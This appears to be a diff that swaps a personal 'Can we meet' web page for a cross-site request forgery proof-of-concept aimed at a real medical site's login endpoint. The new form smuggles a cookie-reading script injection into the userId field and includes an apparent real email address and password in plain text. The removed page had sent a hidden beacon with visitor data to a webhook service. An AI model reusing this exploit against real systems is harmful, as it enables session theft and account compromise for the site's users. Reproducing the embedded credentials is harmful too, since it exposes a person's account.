@@ -1,183 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Can_we_meet 💖</title>
-
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-image: url("ed-robertson-UrF1Jf5PamQ-unsplash.jpg");
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.45);
-            z-index: -1;
-        }
-
-        .container {
-            text-align: center;
-            width: 420px;
-            height: 260px;
-            background: rgba(255, 255, 255, 0.15);
-            border-radius: 20px;
-            padding: 20px;
-            backdrop-filter: blur(8px);
-            position: relative;
-        }
-
-        h1 {
-            font-size: 36px;
-            color: #fff;
-            margin-bottom: 30px;
-        }
-
-        button {
-            padding: 15px 30px;
-            font-size: 20px;
-            margin: 10px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-
-        #yes {
-            background-color: #ff4d6d;
-            color: white;
-        }
-
-        #no {
-            background-color: #adb5bd;
-            position: absolute;
-            left: 230px;
-            top: 150px;
-            transition: all 0.25s ease;
-        }
-
-        .overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.6);
-            display: none;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .modal {
-            background: white;
-            padding: 25px;
-            border-radius: 15px;
-            width: 360px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-        }
-
-        .modal h2 {
-            color: red;
-            margin-bottom: 10px;
-        }
-
-        /* 🎞️ GIF styling */
-        .gif-box {
-            max-width: 260px;
-            margin: 10px auto 15px;
-            border-radius: 12px;
-            overflow: hidden;
-        }
-
-        .close-btn {
-            background: red;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 8px;
-            border: none;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h1>Can we meet once, please Shikha?</h1>
-
-    <button id="yes" onclick="goToLovePage()">Yes ❤️</button>
-    <button id="no"
-        onmouseenter="moveNo()"
-        onclick="showError()">No 💔</button>
-</div>
-
-<div class="overlay" id="overlay">
-    <div class="modal">
-        <h2>❌ Error</h2>
-
-        <!-- 🎞️ Tenor GIF (NEW ONE) -->
-        <div class="gif-box">
-            <div class="tenor-gif-embed"
-                 data-postid="18416242542273982790"
-                 data-share-method="host"
-                 data-aspect-ratio="1.21622"
-                 data-width="100%">
-                <a href="https://tenor.com/view/ivide-ivide-enthanavo-nadakkane-enikk-onnum-manasilakunnillallo-dhamu-suraj-chattampi-nadu-mamookka-gif-18416242542273982790">
-                    Ivide Ivide GIF
-                </a>
-            </div>
-        </div>
-
-        <p>Can you please think again.... 😢💔</p>
-
-        <button class="close-btn" onclick="closeError()">OK</button>
-    </div>
-</div>
-
-<script>
-    const WEBHOOK_URL = "https://webhook.site/11e56490-87f7-40b1-be5d-b7bd91782ff1";
-
-    function goToLovePage() {
-        navigator.sendBeacon(
-            WEBHOOK_URL,
-            JSON.stringify({
-                event: "valentine_yes_clicked",
-                page: "index.html",
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            })
-        );
-        window.location.href = "thankyou.html";
-    }
-
-    function showError() {
-        document.getElementById("overlay").style.display = "flex";
-    }
-
-    function closeError() {
-        document.getElementById("overlay").style.display = "none";
-    }
-
-    function moveNo() {
-        const noBtn = document.getElementById("no");
-        const container = document.querySelector(".container");
-
-        const maxX = container.clientWidth - noBtn.offsetWidth;
-        const maxY = container.clientHeight - noBtn.offsetHeight;
-
-        noBtn.style.left = Math.random() * maxX + "px";
-        noBtn.style.top = Math.random() * maxY + "px";
-    }
-</script>
-
-<!-- Tenor embed script -->
-<script async src="https://tenor.com/embed.js"></script>
-
-</body>
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://login.medscape.com/login/sso/login?lang=en&ac=401&urlCache=aHR0cHM6Ly93d3cubWVkc2NhcGUuY29tL2xvZ2luL3Nzby9sb2dpbj9sYW5nPWVuJmFjPTQwMQ==">
+			<input type="hidden" name="userId" value="aswinkichu15%40gmail.com';alert(document.cookie);'">
+			<input type="hidden" name="password" value="Hsr@1234">
+			<input type="hidden" name="prevFormUrl" value="fpf">
+			<input type="hidden" name="isSocialEnable" value="true">
+			<input type="hidden" name="linkedSites" value="">
+			<input type="hidden" name="urlCache" value="aHR0cHM6Ly93d3cubWVkc2NhcGUuY29tL2xvZ2luL3Nzby9sb2dpbj9sYW5nPWVuJmFjPTQwMQ==">
+			<input type="hidden" name="spa" value="">
+			<input type="hidden" name="facilitatedUrl" value="">
+			<input type="hidden" name="client" value="">
+			<input type="hidden" name="lang" value="en">
+			<input type="hidden" name="scode" value="msp">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
 </html>
